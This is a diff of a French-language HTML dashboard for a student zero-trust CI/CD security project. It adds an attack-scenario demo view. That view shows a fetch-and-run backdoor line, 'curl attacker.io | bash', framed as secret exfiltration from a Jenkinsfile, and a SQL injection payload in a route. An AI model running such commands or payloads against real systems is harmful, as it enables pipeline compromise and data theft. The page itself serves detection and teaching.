@@ -3,10 +3,10 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>ZeroTrust CI — Pipeline Dashboard</title>
+<title>ZeroTrust CI/CD — ENSA PFS 2026</title>
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@tabler/icons-webfont@3.14.0/dist/tabler-icons.min.css">
 <link rel="preconnect" href="https://fonts.googleapis.com">
-<link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
 <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
 <link rel="stylesheet" href="/static/css/dashboard.css">
 </head>
@@ -18,12 +18,13 @@
     <div class="sidebar-logo">
       <div class="logo-mark"><i class="ti ti-shield-lock"></i></div>
       <div>
-        <div class="logo-text">ZeroTrust CI</div>
+        <div class="logo-text">ZT-Pipeline</div>
         <div class="logo-sub">ENSA · PFS 2026</div>
       </div>
     </div>
 
     <nav class="sidebar-nav">
+      <div class="nav-group-label">Vue générale</div>
       <div class="nav-item active" onclick="showDashboard(event)">
         <i class="ti ti-layout-dashboard"></i> Dashboard
       </div>
@@ -33,55 +34,66 @@
       </div>
 
       <div class="nav-group-label">Pipeline</div>
-      <div class="nav-item" onclick="showDashboard(event)">
+      <div class="nav-item" onclick="jumpTo('pipelineSection', event)">
         <i class="ti ti-git-branch"></i> Stages
-        <span class="nav-badge" id="stagesBadge">–</span>
+        <span class="nav-badge ok" id="stagesBadge">–</span>
       </div>
-      <div class="nav-item" onclick="filterFindings('all'); showDashboard(event)">
+      <div class="nav-item" onclick="jumpToFindings('all', event)">
         <i class="ti ti-bug"></i> Vulnérabilités
         <span class="nav-badge warn" id="findingsBadge">–</span>
       </div>
-      <div class="nav-item" onclick="showDashboard(event)">
-        <i class="ti ti-fire"></i> Scénarios
+      <div class="nav-item" onclick="showConsoleView(event)">
+        <i class="ti ti-terminal-2"></i> Console
+        <span class="nav-pill-badge live" id="consoleLive">LIVE</span>
       </div>
-      <div class="nav-item" onclick="showDashboard(event)">
+      <div class="nav-item" onclick="showAttacks(event)">
+        <i class="ti ti-shield-exclamation"></i> Scénarios d'attaque
+        <span class="nav-pill-badge red">4</span>
+      </div>
+      <div class="nav-item" onclick="showZeroTrust(event)">
         <i class="ti ti-shield-check"></i> Zero Trust
+        <span class="nav-pill-badge blue">LIVE</span>
       </div>
 
       <div class="nav-group-label">Security Scans</div>
-      <div class="nav-item" onclick="filterFindings('SAST'); showDashboard(event)">
+      <div class="nav-item" onclick="jumpToFindings('SAST', event)">
         <i class="ti ti-code"></i> SAST — Semgrep
       </div>
-      <div class="nav-item" onclick="filterFindings('SCA'); showDashboard(event)">
+      <div class="nav-item" onclick="jumpToFindings('SCA', event)">
         <i class="ti ti-package"></i> SCA — Trivy
       </div>
-      <div class="nav-item" onclick="filterFindings('DAST'); showDashboard(event)">
+      <div class="nav-item" onclick="jumpToFindings('DAST', event)">
         <i class="ti ti-antenna"></i> DAST — ZAP
       </div>
 
       <div class="nav-group-label">Agents IA</div>
-      <div class="nav-item" onclick="showDashboard(event)">
-        <i class="ti ti-brain"></i> Remédiation
+      <div class="nav-item" onclick="showRemediation(event)">
+        <i class="ti ti-brain"></i> Remédiation IA
       </div>
-      <div class="nav-item" onclick="showDashboard(event)">
-        <i class="ti ti-lock-access"></i> Anti-Tamper
+      <div class="nav-item" onclick="showAntiTamper(event)">
+        <i class="ti ti-lock-access"></i> Anti-Tampering
       </div>
-      <div class="nav-item" onclick="simulateFallback()">
+      <div class="nav-item nav-item--action" onclick="simulateFallback()">
         <i class="ti ti-refresh"></i> Simulate Fallback
+        <span class="nav-live-dot" id="fallbackDot"></span>
       </div>
 
       <div class="nav-group-label">Téléchargements</div>
       <div class="nav-item" onclick="downloadFile('trivy-report.json')">
-        <i class="ti ti-download"></i> Trivy JSON
+        <i class="ti ti-package"></i> Trivy SCA
+        <i class="ti ti-download nav-dl-icon"></i>
       </div>
       <div class="nav-item" onclick="downloadFile('semgrep-results.json')">
-        <i class="ti ti-download"></i> Semgrep JSON
+        <i class="ti ti-code"></i> Semgrep SAST
+        <i class="ti ti-download nav-dl-icon"></i>
       </div>
       <div class="nav-item" onclick="downloadFile('zap-report.html')">
-        <i class="ti ti-download"></i> ZAP Report
+        <i class="ti ti-antenna"></i> ZAP DAST
+        <i class="ti ti-download nav-dl-icon"></i>
       </div>
       <div class="nav-item" onclick="downloadFile('rapport-zerotrust.pdf')">
-        <i class="ti ti-download"></i> Rapport PDF
+        <i class="ti ti-file-type-pdf"></i> Rapport PDF
+        <i class="ti ti-download nav-dl-icon"></i>
       </div>
     </nav>
 
@@ -101,50 +113,47 @@
 
     <!-- TOPBAR -->
     <header class="topbar">
-      <div class="topbar-search">
-        <i class="ti ti-search"></i>
-        <input type="text" placeholder="Rechercher…" />
+      <div class="topbar-left">
+        <span class="chip ok" id="liveStatus"><span class="dot ok"></span>Jenkins connecté</span>
+        <span class="chip blue" id="buildNum">Build #—</span>
       </div>
-      <div class="topbar-spacer"></div>
-      <span class="chip ok" id="liveStatus"><span class="dot ok"></span>Jenkins actif</span>
-      <span class="chip blue" id="buildNum">Build #—</span>
-      <button class="topbar-btn" onclick="simulateFallback()"><i class="ti ti-refresh"></i> Simulate Fallback</button>
-      <button class="topbar-btn" onclick="refreshAll()"><i class="ti ti-reload"></i> Refresh</button>
-      <div class="icon-btn" title="Notifications"><i class="ti ti-bell"></i></div>
-      <div class="icon-btn" title="Paramètres"><i class="ti ti-settings"></i></div>
-      <div class="avatar sm">E3</div>
+      <div class="topbar-center">
+        <div class="build-title-row">
+          <span class="build-name" id="buildTitle">AI-Powered Zero Trust DevSecOps</span>
+          <span class="build-meta">
+            Branch: <span class="mono" id="buildBranch">–</span> &nbsp;·&nbsp;
+            Commit: <span class="mono accent" id="commitHash">–</span> &nbsp;·&nbsp;
+            <span id="buildTime">–</span>
+          </span>
+        </div>
+      </div>
+      <div class="topbar-right">
+        <div class="timer-wrap">
+          <span class="timer-val" id="timer">00:00</span>
+          <span class="chip amber" id="buildStatus"><span class="dot warn"></span>Chargement…</span>
+        </div>
+        <button class="topbar-btn" onclick="simulateFallback()"><i class="ti ti-switch-horizontal"></i> Fallback</button>
+        <button class="topbar-btn primary" onclick="triggerPipeline(this)"><i class="ti ti-player-play"></i> Lancer</button>
+        <div class="refresh-lbl" id="lastRefresh">–</div>
+      </div>
     </header>
 
     <!-- CONTENT -->
-    <div class="content">
+    <div class="content" id="mainContent">
 
-      <!-- Page header (partagé entre les vues) -->
-      <div class="page-header">
-        <div>
-          <div class="page-title" id="buildTitle">feat/zero-trust-v2</div>
-          <div class="page-sub">
-            Branch: <span id="buildBranch">–</span> &nbsp;·&nbsp;
-            Commit: <span class="mono" id="commitHash">–</span> &nbsp;·&nbsp;
-            Heure: <span id="buildTime">–</span> &nbsp;·&nbsp;
-            <span id="lastRefresh" style="color:var(--text-muted)">–</span>
-          </div>
-        </div>
-        <div style="display:flex;gap:8px;align-items:center">
-          <div class="build-dur" id="timer">00:00</div>
-          <span class="chip amber" id="buildStatus"><span class="dot warn"></span>Chargement...</span>
-          <button class="btn btn-primary" onclick="triggerPipeline(this)">
-            <i class="ti ti-player-play"></i>Lancer pipeline
-          </button>
-        </div>
-      </div>
-
-      <!-- ═══════════════════════ VIEW: DASHBOARD ═══════════════════════ -->
+      <!-- ═══ VIEW: DASHBOARD ═══ -->
       <div id="view-dashboard">
 
-        <!-- PIPELINE FLOW -->
-        <div class="card pipeline-card">
+        <div class="build-banner" id="buildBanner" style="display:none">
+          <span class="banner-pulse"></span>
+          <i class="ti ti-loader-2 spin"></i>
+          Build <strong id="bannerBuildNum">#—</strong> en cours — les métriques affichées sont du dernier build terminé
+        </div>
+
+        <!-- PIPELINE SECTION -->
+        <div class="card pipeline-card" id="pipelineSection">
           <div class="card-header">
-            <div class="card-title">Pipeline CI/CD Zero Trust</div>
+            <div class="card-title"><i class="ti ti-git-branch"></i> Pipeline CI/CD Zero Trust</div>
             <div class="card-subtitle">Jenkins local · Claude primaire → Ollama fallback · DAST intégré</div>
             <div class="flow-legend">
               <span class="legend-item"><span class="ldot done"></span>Terminé</span>
@@ -155,9 +164,7 @@
           </div>
           <div class="flow-scroll">
             <div class="flow-track" id="flowTrack">
-              <div class="empty-state" style="padding:20px">
-                <i class="ti ti-loader-2 spin"></i> Connexion à Jenkins…
-              </div>
+              <div class="empty-state"><i class="ti ti-loader-2 spin"></i> Connexion à Jenkins…</div>
             </div>
           </div>
           <div class="progress-bar-wrap">
@@ -171,78 +178,77 @@
             <div class="metric-icon white"><i class="ti ti-clock-bolt"></i></div>
             <div class="metric-label">MTTR moyen</div>
             <div class="metric-value">3.5<span class="metric-unit">min</span></div>
-            <div class="metric-tag"><i class="ti ti-trending-down"></i>-93% vs manuel</div>
+            <div class="metric-tag"><i class="ti ti-trending-down"></i>−93% vs manuel</div>
           </div>
-          <div class="metric-card" onclick="filterFindings('SCA')">
+          <div class="metric-card" onclick="jumpToFindings('SCA')">
             <div class="metric-icon red"><i class="ti ti-bug"></i></div>
             <div class="metric-label">CVEs détectés</div>
             <div class="metric-value red" id="m-cve">–</div>
             <div class="metric-sub" id="m-cve-sub">– critical · – high</div>
           </div>
-          <div class="metric-card" onclick="filterFindings('SAST')">
+          <div class="metric-card" onclick="jumpToFindings('SAST')">
             <div class="metric-icon amber"><i class="ti ti-code"></i></div>
             <div class="metric-label">SAST findings</div>
             <div class="metric-value amber" id="m-sast">–</div>
             <div class="metric-sub" id="m-sast-sub">Semgrep analysis</div>
           </div>
-          <div class="metric-card" onclick="filterFindings('DAST')">
+          <div class="metric-card" onclick="jumpToFindings('DAST')">
             <div class="metric-icon blue"><i class="ti ti-antenna"></i></div>
             <div class="metric-label">ZAP alerts</div>
             <div class="metric-value blue" id="m-zap">–</div>
             <div class="metric-sub" id="m-zap-sub">– high severity</div>
           </div>
-          <div class="metric-card" onclick="showMonitoring()" style="cursor:pointer">
-            <div class="metric-icon" id="m-score-icon" style="background:rgba(92,110,248,.12);color:#5C6EF8"><i class="ti ti-shield-half"></i></div>
+          <div class="metric-card" onclick="showMonitoring()">
+            <div class="metric-icon indigo"><i class="ti ti-shield-half"></i></div>
             <div class="metric-label">Score sécurité</div>
-            <div class="metric-value" id="m-score" style="color:#5C6EF8">–</div>
+            <div class="metric-value indigo" id="m-score">–</div>
             <div class="metric-sub" id="m-score-sub">Gate: –</div>
           </div>
           <div class="metric-card">
             <div class="metric-icon purple"><i class="ti ti-brain"></i></div>
             <div class="metric-label">AI Provider actif</div>
-            <div class="metric-value purple" id="m-ai">–</div>
+            <div class="metric-value purple ai-prov" id="m-ai">–</div>
             <div class="metric-sub" id="m-ai-sub">– calls · – fallbacks</div>
           </div>
         </div>
 
-        <!-- TWO COLUMNS -->
-        <div class="two-col">
+        <!-- MAIN SPLIT: Findings | Console | AI -->
+        <div class="dashboard-split">
 
           <!-- LEFT: Findings -->
-          <div class="card findings-card">
+          <div class="card findings-card" id="findingsCard">
             <div class="tab-bar">
-              <div class="tab active" onclick="filterFindings('all', this)">Tous <span id="tabAll">(–)</span></div>
-              <div class="tab" onclick="filterFindings('critical', this)">Critique</div>
-              <div class="tab" onclick="filterFindings('high', this)">Haut</div>
-              <div class="tab" onclick="filterFindings('SAST', this)">SAST</div>
-              <div class="tab" onclick="filterFindings('SCA', this)">SCA</div>
-              <div class="tab" onclick="filterFindings('DAST', this)">DAST</div>
+              <div class="tab active" onclick="filterFindings('all', this)"><i class="ti ti-list"></i> Tous <span class="tab-count" id="tabAll">(–)</span></div>
+              <div class="tab" onclick="filterFindings('critical', this)"><i class="ti ti-alert-triangle"></i> Critique <span class="tab-count tab-count--crit" id="tabCrit">(–)</span></div>
+              <div class="tab" onclick="filterFindings('high', this)"><i class="ti ti-alert-circle"></i> Haut <span class="tab-count tab-count--high" id="tabHigh">(–)</span></div>
+              <div class="tab" onclick="filterFindings('SAST', this)"><i class="ti ti-code"></i> SAST <span class="tab-count" id="tabSAST">(–)</span></div>
+              <div class="tab" onclick="filterFindings('SCA', this)"><i class="ti ti-package"></i> SCA <span class="tab-count" id="tabSCA">(–)</span></div>
+              <div class="tab" onclick="filterFindings('DAST', this)"><i class="ti ti-antenna"></i> DAST <span class="tab-count" id="tabDAST">(–)</span></div>
             </div>
-            <div id="findingsList">
-              <div class="empty-state"><i class="ti ti-loader-2 spin"></i><br>Chargement des findings...</div>
-            </div>
+            <div id="findingsList"><div class="empty-state"><i class="ti ti-loader-2 spin"></i><br>Chargement…</div></div>
           </div>
 
-          <!-- RIGHT -->
-          <div class="right-col">
+          <!-- RIGHT: Console + AI + Downloads stacked -->
+          <div class="right-stack">
 
-            <!-- Console -->
+            <!-- Console — taille généreuse -->
             <div class="card console-card">
               <div class="console-header">
-                <i class="ti ti-terminal" style="color:var(--success);font-size:14px"></i>
-                <span class="console-title">Console Jenkins</span>
+                <div class="console-dots"><span class="cdot r"></span><span class="cdot a"></span><span class="cdot g"></span></div>
+                <span class="console-title"><i class="ti ti-terminal-2"></i> Console Jenkins</span>
                 <div class="console-actions">
-                  <button class="icon-btn" title="Vider" onclick="clearConsole()"><i class="ti ti-trash"></i></button>
-                  <button class="icon-btn" title="Bas" onclick="scrollConsole()"><i class="ti ti-arrow-down"></i></button>
-                  <button class="icon-btn" title="Copier" onclick="copyLogs()"><i class="ti ti-copy"></i></button>
+                  <button class="icon-btn" onclick="clearConsole()" title="Vider"><i class="ti ti-trash"></i></button>
+                  <button class="icon-btn" onclick="scrollConsole()" title="Bas"><i class="ti ti-arrow-down"></i></button>
+                  <button class="icon-btn" onclick="copyLogs()" title="Copier"><i class="ti ti-copy"></i></button>
+                  <button class="icon-btn" onclick="showConsoleView()" title="Plein écran"><i class="ti ti-maximize"></i></button>
                 </div>
               </div>
               <div class="console-body" id="consoleBody"></div>
             </div>
 
-            <!-- AI Fallback Status -->
+            <!-- AI Fallback -->
             <div class="card ai-card">
-              <div class="ai-label"><i class="ti ti-robot"></i> AI Fallback Status</div>
+              <div class="ai-label"><i class="ti ti-cpu"></i> AI Fallback Status</div>
               <div class="fallback-flow">
                 <div class="provider-row primary">
                   <div class="provider-icon claude"><i class="ti ti-stars"></i></div>
@@ -254,7 +260,7 @@
                 </div>
                 <div class="connector-arrow">↓ fallback automatique si indisponible</div>
                 <div class="provider-row">
-                  <div class="provider-icon ollama"><i class="ti ti-cpu"></i></div>
+                  <div class="provider-icon ollama"><i class="ti ti-server"></i></div>
                   <div class="provider-info">
                     <div class="provider-name">Ollama Mistral 7B — Fallback</div>
                     <div class="provider-detail">localhost:11434 · données locales · &lt;35s</div>
@@ -263,57 +269,210 @@
                 </div>
               </div>
               <div class="ai-stats">
-                <div>Calls: <b class="purple" id="aiCalls">–</b></div>
-                <div>Fallbacks: <b class="amber" id="fallbackCount">0</b></div>
-                <div>Provider: <b id="m-ai-provider">–</b></div>
+                Calls: <b class="purple" id="aiCalls">–</b> &nbsp;·&nbsp;
+                Fallbacks: <b class="amber" id="fallbackCount">0</b> &nbsp;·&nbsp;
+                Provider: <b id="m-ai-provider">–</b>
               </div>
             </div>
 
             <!-- Downloads -->
             <div class="card dl-card">
-              <div class="ai-label"><i class="ti ti-download"></i> Télécharger les rapports</div>
+              <div class="ai-label"><i class="ti ti-download"></i> Rapports</div>
               <div class="dl-grid">
-                <button class="dl-btn" onclick="downloadFile('trivy-report.json')">
-                  <i class="ti ti-package"></i>
-                  <div><div class="dl-name">Trivy SCA</div><div class="dl-sub">JSON · CVEs</div></div>
-                </button>
-                <button class="dl-btn" onclick="downloadFile('zap-report.html')">
-                  <i class="ti ti-antenna"></i>
-                  <div><div class="dl-name">ZAP DAST</div><div class="dl-sub">HTML Report</div></div>
-                </button>
-                <button class="dl-btn" onclick="downloadFile('semgrep-results.json')">
-                  <i class="ti ti-code"></i>
-                  <div><div class="dl-name">Semgrep SAST</div><div class="dl-sub">JSON · SAST</div></div>
-                </button>
-                <button class="dl-btn" onclick="downloadFile('rapport-zerotrust.pdf')">
-                  <i class="ti ti-file-type-pdf"></i>
-                  <div><div class="dl-name">Rapport PDF</div><div class="dl-sub">Rapport complet</div></div>
-                </button>
+                <button class="dl-btn" onclick="downloadFile('trivy-report.json')"><i class="ti ti-package"></i><div><div class="dl-name">Trivy SCA</div><div class="dl-sub">JSON · CVEs</div></div></button>
+                <button class="dl-btn" onclick="downloadFile('zap-report.html')"><i class="ti ti-antenna"></i><div><div class="dl-name">ZAP DAST</div><div class="dl-sub">HTML Report</div></div></button>
+                <button class="dl-btn" onclick="downloadFile('semgrep-results.json')"><i class="ti ti-code"></i><div><div class="dl-name">Semgrep SAST</div><div class="dl-sub">JSON · SAST</div></div></button>
+                <button class="dl-btn" onclick="downloadFile('rapport-zerotrust.pdf')"><i class="ti ti-file-type-pdf"></i><div><div class="dl-name">Rapport PDF</div><div class="dl-sub">Rapport complet</div></div></button>
               </div>
             </div>
 
-          </div>
-        </div>
+          </div><!-- /right-stack -->
+        </div><!-- /dashboard-split -->
 
         <!-- HISTORY -->
         <div class="card history-card">
           <div class="card-header">
-            <div class="card-title"><i class="ti ti-history" style="margin-right:6px;color:var(--accent)"></i>Historique des builds</div>
-            <div class="card-subtitle">Résultats archivés · cliquer sur un build pour les détails et rapports</div>
+            <div class="card-title"><i class="ti ti-history"></i> Historique des builds</div>
+            <div class="card-subtitle">Résultats archivés · cliquer sur un build pour les détails</div>
           </div>
-          <div id="historyList" class="history-list">
-            <div class="history-empty"><i class="ti ti-loader-2 spin"></i><br>Chargement…</div>
-          </div>
+          <div id="historyList" class="history-list"><div class="history-empty"><i class="ti ti-loader-2 spin"></i><br>Chargement…</div></div>
         </div>
 
       </div><!-- /#view-dashboard -->
 
-      <!-- ═══════════════════════ VIEW: MONITORING ═══════════════════════ -->
+      <!-- ═══ VIEW: CONSOLE PLEIN ÉCRAN ═══ -->
+      <div id="view-console" style="display:none;flex-direction:column;height:100%">
+        <div class="view-header">
+          <h2><i class="ti ti-terminal-2"></i> Console Jenkins — Logs temps réel</h2>
+          <div class="view-actions">
+            <button class="topbar-btn" onclick="clearConsole()"><i class="ti ti-trash"></i> Vider</button>
+            <button class="topbar-btn" onclick="scrollConsole()"><i class="ti ti-arrow-down"></i> Bas</button>
+            <button class="topbar-btn" onclick="copyLogs()"><i class="ti ti-copy"></i> Copier</button>
+            <button class="topbar-btn primary" onclick="showDashboard()"><i class="ti ti-arrow-left"></i> Dashboard</button>
+          </div>
+        </div>
+        <div class="console-full-wrap card">
+          <div class="console-full" id="consoleBodyFull"></div>
+        </div>
+      </div>
+
+      <!-- ═══ VIEW: SCÉNARIOS D'ATTAQUE ═══ -->
+      <div id="view-attacks" style="display:none">
+        <div class="view-header">
+          <h2><i class="ti ti-shield-exclamation"></i> Scénarios d'attaque — Démonstration Zero Trust</h2>
+          <div class="view-actions">
+            <button class="topbar-btn primary" onclick="showDashboard()"><i class="ti ti-arrow-left"></i> Dashboard</button>
+          </div>
+        </div>
+
+        <div class="attacks-intro card">
+          <div class="attacks-intro-inner">
+            <div class="attacks-intro-icon"><i class="ti ti-sword"></i></div>
+            <div>
+              <div class="attacks-intro-title">Pipeline Zero Trust sous attaque</div>
+              <div class="attacks-intro-sub">4 scénarios réels démontrant la détection automatique, la remédiation IA et le basculement fallback. Chaque scénario est exécutable en live.</div>
+            </div>
+            <button class="btn btn-danger" onclick="runAllScenarios()"><i class="ti ti-player-play"></i> Tout lancer</button>
+          </div>
+        </div>
+
+        <div class="attacks-grid">
+
+          <!-- Scénario 1 -->
+          <div class="attack-card" id="atk-1">
+            <div class="attack-header">
+              <div class="attack-num">01</div>
+              <div class="attack-badge sca">SCA · Trivy</div>
+              <div class="attack-status" id="atk-1-status"><span class="atk-dot idle"></span>En attente</div>
+            </div>
+            <div class="attack-icon"><i class="ti ti-package-import"></i></div>
+            <div class="attack-title">Injection CVE Critique</div>
+            <div class="attack-desc">Injection d'une dépendance vulnérable dans <code>requirements.txt</code>. Trivy détecte le CVE et l'agent IA génère automatiquement le patch.</div>
+            <div class="attack-flow">
+              <span class="aflow-step">Ajout <code>py==1.11.0</code></span>
+              <span class="aflow-arrow">→</span>
+              <span class="aflow-step">Trivy scan</span>
+              <span class="aflow-arrow">→</span>
+              <span class="aflow-step red">CVE-2022-42969</span>
+              <span class="aflow-arrow">→</span>
+              <span class="aflow-step green">IA patch auto</span>
+            </div>
+            <div class="attack-details">
+              <div class="adetail"><span>CVE</span><span class="mono red">CVE-2022-42969 · CVSS 7.5</span></div>
+              <div class="adetail"><span>Fix IA</span><span class="mono green">py → 1.11.0.post0</span></div>
+              <div class="adetail"><span>MTTR</span><span class="mono">~3 min (–93% vs manuel)</span></div>
+            </div>
+            <button class="atk-btn" onclick="runScenario(1)"><i class="ti ti-player-play"></i> Simuler</button>
+          </div>
+
+          <!-- Scénario 2 -->
+          <div class="attack-card" id="atk-2">
+            <div class="attack-header">
+              <div class="attack-num">02</div>
+              <div class="attack-badge pipeline">Pipeline · Anti-Tamper</div>
+              <div class="attack-status" id="atk-2-status"><span class="atk-dot idle"></span>En attente</div>
+            </div>
+            <div class="attack-icon"><i class="ti ti-code-asterisk"></i></div>
+            <div class="attack-title">Backdoor dans le Jenkinsfile</div>
+            <div class="attack-desc">Injection d'une étape malveillante dans le Jenkinsfile : exfiltration de secrets via <code>curl</code>. L'agent Anti-Tamper détecte et bloque le déploiement.</div>
+            <div class="attack-flow">
+              <span class="aflow-step">Ajout <code>curl | bash</code></span>
+              <span class="aflow-arrow">→</span>
+              <span class="aflow-step">Anti-Tamper</span>
+              <span class="aflow-arrow">→</span>
+              <span class="aflow-step red">ALERTE</span>
+              <span class="aflow-arrow">→</span>
+              <span class="aflow-step green">Pipeline bloqué</span>
+            </div>
+            <div class="attack-details">
+              <div class="adetail"><span>Payload</span><span class="mono red">curl attacker.io | bash</span></div>
+              <div class="adetail"><span>Détection</span><span class="mono green">Claude Anti-Tamper</span></div>
+              <div class="adetail"><span>MTTR</span><span class="mono">~2 min (–97% vs manuel)</span></div>
+            </div>
+            <button class="atk-btn" onclick="runScenario(2)"><i class="ti ti-player-play"></i> Simuler</button>
+          </div>
+
+          <!-- Scénario 3 -->
+          <div class="attack-card" id="atk-3">
+            <div class="attack-header">
+              <div class="attack-num">03</div>
+              <div class="attack-badge dast">SAST + DAST</div>
+              <div class="attack-status" id="atk-3-status"><span class="atk-dot idle"></span>En attente</div>
+            </div>
+            <div class="attack-icon"><i class="ti ti-database-exclamation"></i></div>
+            <div class="attack-title">Injection SQL — Détection Live</div>
+            <div class="attack-desc">Semgrep détecte l'injection SQL dans le code source. OWASP ZAP confirme la vulnérabilité en runtime avec des payloads réels <code>' OR 1=1--</code>.</div>
+            <div class="attack-flow">
+              <span class="aflow-step red">SQLi dans app.py</span>
+              <span class="aflow-arrow">→</span>
+              <span class="aflow-step">Semgrep SAST</span>
+              <span class="aflow-arrow">→</span>
+              <span class="aflow-step">ZAP DAST</span>
+              <span class="aflow-arrow">→</span>
+              <span class="aflow-step green">Patch paramétrisé</span>
+            </div>
+            <div class="attack-details">
+              <div class="adetail"><span>Route</span><span class="mono red">/user?username=' OR 1=1--</span></div>
+              <div class="adetail"><span>Confirmé par</span><span class="mono">Semgrep + OWASP ZAP</span></div>
+              <div class="adetail"><span>MTTR</span><span class="mono">~5 min (–83% vs manuel)</span></div>
+            </div>
+            <button class="atk-btn" onclick="runScenario(3)"><i class="ti ti-player-play"></i> Simuler</button>
+          </div>
+
+          <!-- Scénario 4 -->
+          <div class="attack-card" id="atk-4">
+            <div class="attack-header">
+              <div class="attack-num">04</div>
+              <div class="attack-badge ai">IA · Fallback</div>
+              <div class="attack-status" id="atk-4-status"><span class="atk-dot idle"></span>En attente</div>
+            </div>
+            <div class="attack-icon"><i class="ti ti-wifi-off"></i></div>
+            <div class="attack-title">Coupure Réseau — Fallback IA</div>
+            <div class="attack-desc">Simulation d'indisponibilité de l'API Claude. Le système bascule automatiquement sur Ollama Mistral 7B en moins de 35 secondes, sans interruption du pipeline.</div>
+            <div class="attack-flow">
+              <span class="aflow-step red">Claude offline</span>
+              <span class="aflow-arrow">→</span>
+              <span class="aflow-step">Timeout 30s</span>
+              <span class="aflow-arrow">→</span>
+              <span class="aflow-step amber">Ollama activé</span>
+              <span class="aflow-arrow">→</span>
+              <span class="aflow-step green">Pipeline continue</span>
+            </div>
+            <div class="attack-details">
+              <div class="adetail"><span>Délai bascule</span><span class="mono green">&lt; 35 secondes</span></div>
+              <div class="adetail"><span>Fallback</span><span class="mono amber">Ollama Mistral 7B local</span></div>
+              <div class="adetail"><span>Données</span><span class="mono green">100% locales (Zero Trust)</span></div>
+            </div>
+            <button class="atk-btn highlight" onclick="runScenario(4)"><i class="ti ti-switch-horizontal"></i> Simuler</button>
+          </div>
+
+        </div><!-- /attacks-grid -->
+
+        <!-- Scénario Log Live -->
+        <div class="card atk-log-card">
+          <div class="console-header">
+            <div class="console-dots"><span class="cdot r"></span><span class="cdot a"></span><span class="cdot g"></span></div>
+            <span class="console-title"><i class="ti ti-terminal-2"></i> Log scénario en cours</span>
+            <div class="console-actions">
+              <button class="icon-btn" onclick="document.getElementById('atkLog').innerHTML=''"><i class="ti ti-trash"></i></button>
+            </div>
+          </div>
+          <div class="console-body" id="atkLog" style="height:200px">
+            <div class="log-line"><span class="log-ts">–</span><span class="log-stage i">SYS</span><span class="log-text blue">Sélectionner un scénario ci-dessus pour démarrer la simulation…</span></div>
+          </div>
+        </div>
+
+      </div><!-- /#view-attacks -->
+
+      <!-- ═══ VIEW: MONITORING ═══ -->
       <div id="view-monitoring" style="display:none">
-
-        <!-- Top row: gauge + breakdown + stats -->
+        <div class="view-header">
+          <h2><i class="ti ti-chart-dots-3"></i> Monitoring — Score &amp; Tendances</h2>
+          <div class="view-actions">
+            <button class="topbar-btn primary" onclick="showDashboard()"><i class="ti ti-arrow-left"></i> Dashboard</button>
+          </div>
+        </div>
         <div class="mon-top">
-
           <div class="card score-card">
             <div class="score-gauge-wrap">
               <canvas id="scoreGaugeChart"></canvas>
@@ -324,13 +483,12 @@
               </div>
             </div>
             <div class="gate-row">
-              <i class="ti ti-shield-check gate-icon" id="gateIcon"></i>
+              <i class="ti gate-icon" id="gateIcon"></i>
               <span class="gate-label">Security Gate <span style="color:var(--text-muted);font-size:11px">(seuil 90)</span></span>
               <span class="gate-badge" id="gateBadge">–</span>
             </div>
             <div class="gate-msg" id="gateMsg">Déploiement autorisé si score ≥ 90</div>
           </div>
-
           <div class="card breakdown-card">
             <div class="mon-card-title"><i class="ti ti-list-details"></i> Déductions par catégorie</div>
             <table class="breakdown-table">
@@ -346,37 +504,28 @@
               </tbody>
             </table>
           </div>
-
           <div class="card stats-card">
             <div class="mon-card-title"><i class="ti ti-chart-bar"></i> Statistiques Pipeline</div>
-            <div id="pipelineStats" class="pipeline-stats-grid">
-              <div class="empty-state" style="grid-column:1/-1"><i class="ti ti-loader-2 spin"></i></div>
-            </div>
+            <div id="pipelineStats" class="pipeline-stats-grid"><div class="empty-state" style="grid-column:1/-1"><i class="ti ti-loader-2 spin"></i></div></div>
           </div>
-
-        </div><!-- /.mon-top -->
-
-        <!-- Charts -->
+        </div>
         <div class="mon-charts">
-
-          <div class="card chart-card">
-            <div class="mon-card-title"><i class="ti ti-bug" style="color:#E8525A"></i> CVE par sévérité</div>
-            <div class="chart-wrap"><canvas id="cveSeverityChart"></canvas></div>
-          </div>
-
-          <div class="card chart-card">
-            <div class="mon-card-title"><i class="ti ti-chart-bar" style="color:#5C6EF8"></i> Findings par scanner</div>
-            <div class="chart-wrap"><canvas id="findingsByScanner"></canvas></div>
-          </div>
-
-          <div class="card chart-card chart-wide">
-            <div class="mon-card-title"><i class="ti ti-trending-up" style="color:#3EC97A"></i> Score sécurité — Tendance des builds <span style="color:var(--text-muted);font-weight:400;font-size:11px">(ligne verte = seuil 90)</span></div>
-            <div class="chart-wrap chart-wrap-tall"><canvas id="scoreTrendChart"></canvas></div>
-          </div>
-
-        </div><!-- /.mon-charts -->
-
+          <div class="card chart-card"><div class="mon-card-title"><i class="ti ti-bug" style="color:#E8525A"></i> CVE par sévérité</div><div class="chart-wrap"><canvas id="cveSeverityChart"></canvas></div></div>
+          <div class="card chart-card"><div class="mon-card-title"><i class="ti ti-chart-bar" style="color:#5C6EF8"></i> Findings par scanner</div><div class="chart-wrap"><canvas id="findingsByScanner"></canvas></div></div>
+          <div class="card chart-card chart-wide"><div class="mon-card-title"><i class="ti ti-trending-up" style="color:#3EC97A"></i> Score sécurité — tendance builds</div><div class="chart-wrap chart-wrap-tall"><canvas id="scoreTrendChart"></canvas></div></div>
+        </div>
       </div><!-- /#view-monitoring -->
+
+      <!-- MODAL -->
+      <div id="modal-overlay" class="modal-overlay" style="display:none" onclick="closeModal()">
+        <div class="modal-box" onclick="event.stopPropagation()">
+          <div class="modal-header">
+            <div class="modal-title" id="modalTitle">–</div>
+            <button class="icon-btn" onclick="closeModal()"><i class="ti ti-x"></i></button>
+          </div>
+          <div class="modal-body" id="modalBody"></div>
+        </div>
+      </div>
 
     </div><!-- /content -->
   </div><!-- /main -->
